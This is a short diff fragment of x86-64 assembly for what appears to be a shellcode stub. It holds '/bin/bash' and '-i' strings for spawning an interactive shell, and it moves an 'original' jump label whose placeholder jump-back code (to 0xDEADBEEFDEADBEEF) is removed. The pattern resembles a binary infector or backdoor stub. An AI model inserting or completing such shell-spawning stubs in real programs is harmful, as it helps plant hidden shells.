@@ -71,13 +71,11 @@ _start:
     xor rdi, rdi
     syscall
  
-original:
-    mov rax, 0xDEADBEEFDEADBEEF
-    jmp rax
-
 path:
     db "/bin/bash", 0
 
 flag:
     db "-i", 0
+
+original:
 
